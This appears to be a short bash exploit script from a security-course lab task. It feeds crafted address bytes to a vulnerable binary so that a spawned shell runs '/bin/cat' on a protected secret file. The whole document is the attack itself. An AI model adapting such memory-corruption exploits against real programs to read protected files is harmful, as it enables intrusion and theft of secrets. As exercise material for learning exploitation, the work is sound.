#!/usr/bin/env bash
echo /bin/cat /task4/secret.txt | env -i SHELL=/bin/sh \
  /task4/s1803764/vuln "$(python -c "print('\x10\xee\xe1\xf7SEXY\x8f\xd8\xf5\xf7')")" 1354